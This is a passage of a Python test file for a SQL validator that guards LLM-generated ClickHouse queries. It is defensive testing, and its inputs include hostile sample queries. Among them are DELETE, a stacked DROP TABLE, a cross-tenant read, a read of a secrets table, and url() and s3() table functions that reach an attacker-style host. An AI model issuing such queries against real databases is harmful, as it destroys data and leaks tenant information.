    assert "total_amount" in result.lower()


def test_settings_max_memory_stripped() -> None:
    """SETTINGS max_memory_usage=0 is stripped (another DoS vector)."""
    sql = (
        f"SELECT region FROM {_ALLOWED_TABLE} LIMIT 10 "
        "SETTINGS max_memory_usage=0, max_execution_time=0"
    )
    result = validate_and_cap(
        sql,
        allowed_tables={_ALLOWED_TABLE},
        tenant_db=_TENANT_DB,
        max_rows=_MAX_ROWS,
    )
    assert "SETTINGS" not in result.upper()


# ===========================================================================
# Additional isolation: run_read_only_query never called on failure
# ===========================================================================


@pytest.mark.asyncio
async def test_execute_never_called_after_validation_failure() -> None:
    """On ANY validation failure, run_read_only_query must have zero calls."""
    ctx = _make_ctx()

    failing_sqls = [
        f"DELETE FROM {_ALLOWED_TABLE}",
        "SELECT * FROM secrets",
        f"SELECT region FROM tenant_other.{_ALLOWED_TABLE} LIMIT 5",
        f"SELECT region FROM {_ALLOWED_TABLE} LIMIT 5; DROP TABLE foo",
        "UNSATISFIABLE",
        # FIX 1: TVFs must also be in this list.
        "SELECT * FROM url('http://evil.example.com/x', CSV, 'c String') LIMIT 1",
        "SELECT * FROM s3('s3://bucket/file.parquet', 'Parquet') LIMIT 1",
    ]

    for bad_sql in failing_sqls:
        svc, _, _, mock_ch = _make_service(
            gateway_response=_make_llm_response(bad_sql),
        )
        with pytest.raises(SQLValidationError):
            await svc.query(ctx, question="some question")
        mock_ch.run_read_only_query.assert_not_called(), (
            f"run_read_only_query was called despite validation failure for: {bad_sql!r}"
        )
